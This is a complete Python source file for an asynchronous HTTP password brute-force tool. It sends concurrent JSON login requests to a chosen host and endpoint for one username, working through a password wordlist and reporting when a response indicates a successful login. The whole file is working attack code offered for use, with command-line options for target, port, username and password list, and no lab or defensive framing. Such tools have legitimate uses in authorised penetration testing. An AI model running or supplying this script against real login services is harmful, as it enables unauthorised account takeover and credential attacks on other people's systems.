import asyncio
import aiohttp
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit

def get_args():
    parser = argparse.ArgumentParser(description="HTTP brute-force attack script.")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--endpoint", required=True)
    parser.add_argument('-u', '--username', dest='username', required=True)
    parser.add_argument("--password-file", required=True)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    if args.dry_run:
        print("Dry run mode enabled. Options set:")
        print(f"Host: {args.host}\nPort: {args.port}\nEndpoint: {args.endpoint}\nUsername: {args.username}\nPassword file: {args.password_file}")
        return None
    return args

async def http_bruteforce(session, host, port, endpoint, username, password, found_flag, result_holder):
    if found_flag.is_set():
        return
    url = f"http://{host}:{port}{endpoint}"
    json_data = {'username': username, 'password': password}
    headers = {'Content-Type': 'application/json'}
    try:
        async with session.post(url, json=json_data, headers=headers, timeout=5) as response:
            status = response.status
            text = await response.text()
            if status == 200 and "logged in" in text:  # Adjust this condition for your app's success code/message
                found_flag.set()
                result_holder['password'] = password
                print(colored(
                    f"[{port}] [http] host:{host} endpoint:{endpoint} login:{username} password:{password} [SUCCESS]", 'green'))
                print(colored(f"[Response Text]: {text}", 'cyan'))
            else:
                print(f"[Attempt] target {host} - login:{username} - password:{password} - status:{status}")
    except Exception as err:
        print(colored(f"[!] Error with password '{password}': {type(err).__name__} - {err}", 'red'))

async def main(host, port, endpoint, username, password_file):
    passwords = []
    found_flag = asyncio.Event()
    result_holder = {}
    concurrency_limit = 5

    with open(password_file, 'r') as f:
        passwords = [password.strip() for password in f if password.strip()]

    semaphore = asyncio.Semaphore(concurrency_limit)

    async with aiohttp.ClientSession() as session:
        async def bounded_bruteforce(password):
            async with semaphore:
                if not found_flag.is_set():
                    await http_bruteforce(session, host, port, endpoint, username, password, found_flag, result_holder)

        tasks = [bounded_bruteforce(password) for password in passwords]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    if found_flag.is_set():
        print(colored(f"\n[!] Password found: {result_holder.get('password')}\n", 'green'))
    else:
        print(colored("\n[-] Failed to find the correct password.", "red"))

if __name__ == "__main__":
    arguments = get_args()
    if arguments is None:
        exit(0)

    if not path.exists(arguments.password_file):
        print(colored(
            "[-] password_file location is not right,\n[-] Provide the right path of the password_file", 'red'))
        exit(1)

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Host\t: ", "light_red",), end="")
    print(arguments.host)
    print(colored(f"[*] Port\t: ", "light_red",), end="")
    print(arguments.port)
    print(colored(f"[*] Endpoint\t: ", "light_red",), end="")
    print(arguments.endpoint)
    print(colored(f"[*] Username\t: ", "light_red",), end="")
    print(arguments.username)
    print(colored(f"[*] password_file\t: ", "light_red"), end="")
    print(arguments.password_file)
    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("HTTP")
    print("---------------------------------------------------------\n---------------------------------------------------------", )
    print(colored(
        f"HTTP-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    asyncio.run(main(arguments.host, arguments.port,
                arguments.endpoint, arguments.username, arguments.password_file))


